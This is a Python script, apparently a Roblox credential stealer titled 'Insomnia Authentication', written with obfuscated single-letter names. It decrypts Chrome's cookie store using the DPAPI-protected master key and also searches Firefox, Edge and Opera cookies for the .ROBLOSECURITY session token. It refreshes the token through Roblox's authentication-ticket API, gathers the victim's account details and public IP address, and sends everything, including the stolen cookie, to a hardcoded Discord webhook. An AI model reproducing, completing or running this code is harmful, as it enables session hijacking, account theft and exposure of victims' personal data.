c='description'
b='title'
a='Insomnia Authentication'
Z='User Data'
Y='Chrome'
X='Google'
W='Local'
V='AppData'
U='USERPROFILE'
G=None
E=True
C='inline'
B='value'
A='name'
D='.ROBLOSECURITY'
import os as H,json as M,base64 as d,browser_cookie3 as I,sqlite3 as e,subprocess,shutil as f,win32crypt as P
from Crypto.Cipher import AES
from discordwebhook import Discord as g
import httpx as N,re,requests as O,robloxpy as J
h='https://discord.com/api/webhooks/1264646181452120146/sQFH-ZQmngG89AT3K6Kuypg9n8KSREChGjkrf6EToqsCW3l8cKM5sJ-Yi8D23leLOXEf'
def i():
	B=H.path.join(H.environ[U],V,W,X,Y,Z,'Local State')
	with open(B,'r',encoding='utf-8')as C:A=C.read();A=M.loads(A)
	D=d.b64decode(A['os_crypt']['encrypted_key'])[5:];return P.CryptUnprotectData(D,G,G,G,0)[1]
def j(data,key):
	A=data
	try:B=A[3:15];A=A[15:];C=AES.new(key,AES.MODE_GCM,B);return C.decrypt(A)[:-16].decode()
	except:
		try:return str(P.CryptUnprotectData(A,G,G,G,0)[1])
		except:return''
def Q():
	D=H.path.join(H.environ[U],V,W,X,Y,Z,'Default','Network','Cookies');A='Cookies.db'
	if not H.path.isfile(A):f.copyfile(D,A)
	B=e.connect(A);B.text_factory=lambda b:b.decode(errors='ignore');C=B.cursor();C.execute("\n    SELECT encrypted_value \n    FROM cookies WHERE name='.ROBLOSECURITY'");E=i()
	for(F,)in C.fetchall():G=j(F,E);return G
	B.close()
def R():
	E='roblox.com';A=[]
	try:
		B=I.firefox(domain_name=E)
		for C in B:
			if C.name==D:A.append(B);A.append(C.value);return A
	except:pass
	try:
		B=I.chromium(domain_name=E)
		for C in B:
			if C.name==D:A.append(B);A.append(C.value);return A
	except:pass
	try:
		B=I.edge(domain_name=E)
		for C in B:
			if C.name==D:A.append(B);A.append(C.value);return A
	except:pass
	try:
		B=I.opera(domain_name=E)
		for C in B:
			if C.name==D:A.append(B);A.append(C.value);return A
	except:pass
	try:
		B=I.chrome(domain_name=E)
		for C in B:
			if C.name==D:A.append(B);A.append(C.value);return A
	except:pass
A2=R()
if Q()==G:R()
def k():A=O.get('http://api.ipify.org').text;return A
def l(auth_cookie):B=auth_cookie;C=m(B);A,D=n(C,B);E=N.post('https://auth.roblox.com/v1/authentication-ticket',headers=A,cookies=D,json={});F=E.headers.get('rbx-authentication-ticket','Failed to get authentication ticket');A.update({'RBXAuthenticationNegotiation':'1'});G=N.post('https://auth.roblox.com/v1/authentication-ticket/redeem',headers=A,json={'authenticationTicket':F});H=re.search('.ROBLOSECURITY=(.*?);',G.headers['set-cookie']).group(1);return H
def m(auth_cookie):A=N.get('https://www.roblox.com/home',cookies={D:auth_cookie});B=A.text.split('<meta name="csrf-token" data-token="')[1].split('" />')[0];return B
def n(csrf_token,auth_cookie):A={'Content-Type':'application/json','user-agent':'Roblox/WinInet','origin':'https://www.roblox.com','referer':'https://www.roblox.com/my/account','x-csrf-token':csrf_token};B={D:auth_cookie};return A,B
if __name__=='__main__':
	K=Q();o=J.Utils.CheckCookie(K).lower()
	if o!='valid cookie':K=l(K)
	p=k();S=K;L=M.loads(O.get('https://www.roblox.com/mobileapi/userinfo',cookies={D:S}).text);F=L['UserID'];q=J.User.External.GetRAP(F);r=J.User.Friends.External.GetCount(F);s=J.User.External.GetAge(F);t=J.User.External.CreationDate(F);u=f"https://www.rolimons.com/player/{F}";v=f"https://web.roblox.com/users/{F}/profile";w=O.get(f"https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds={F}&size=420x420&format=Png&isCircular=false").text;x=M.loads(w);y=x['data'][0]['imageUrl'];z=L['UserName'];A0=L['RobuxBalance'];A1=L['IsPremium'];T=g(url=h);T.post(username=a,avatar_url='',embeds=[{b:'Authentication','thumbnail':{'url':y},c:f"[Rolimons]({u}) | [Roblox Profile]({v})",'fields':[{A:'Username',B:f"```{z}```",C:E},{A:'Robux Balance',B:f"```{A0}```",C:E},{A:'Premium Status',B:f"```{A1}```",C:E},{A:'Creation Date',B:f"```{t}```",C:E},{A:'RAP',B:f"```{q}```",C:E},{A:'Friends',B:f"```{r}```",C:E},{A:'Account Age',B:f"```{s}```",C:E},{A:'IP Address',B:f"```{p}```",C:E}]}]);T.post(username=a,avatar_url='',embeds=[{b:D,c:f"```{S}```"}])